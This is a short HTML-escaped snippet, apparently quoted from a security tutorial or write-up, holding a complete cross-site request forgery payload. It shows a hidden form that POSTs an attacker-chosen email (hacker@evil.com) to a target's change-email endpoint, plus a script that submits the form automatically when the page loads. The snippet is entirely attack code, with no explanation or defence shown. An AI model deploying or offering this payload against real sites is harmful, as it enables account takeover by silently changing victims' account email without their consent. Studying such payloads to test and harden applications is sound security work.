		 &lt;form action=&quot;target.com/api/change-email&quot; method=&quot;POST&quot;&gt;
			&lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;hacker@evil.com&quot; /&gt;
			&lt;input type=&quot;submit&quot; value=&quot;Click Me&quot; /&gt;
		 &lt;/form&gt;
		 &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
